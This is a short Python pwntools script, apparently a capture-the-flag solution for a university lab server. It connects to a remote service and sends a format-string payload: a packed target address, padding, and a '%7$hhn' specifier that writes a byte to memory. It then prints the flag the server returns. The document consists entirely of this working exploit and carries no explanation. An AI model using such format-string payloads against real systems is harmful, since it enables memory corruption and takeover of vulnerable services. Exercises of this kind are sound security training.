from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22194"

r = remote(SERVER,PORT)

msg = (b"\x47\xa0\x04\x08" + b"%10x" + b"%7$hhn")

r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()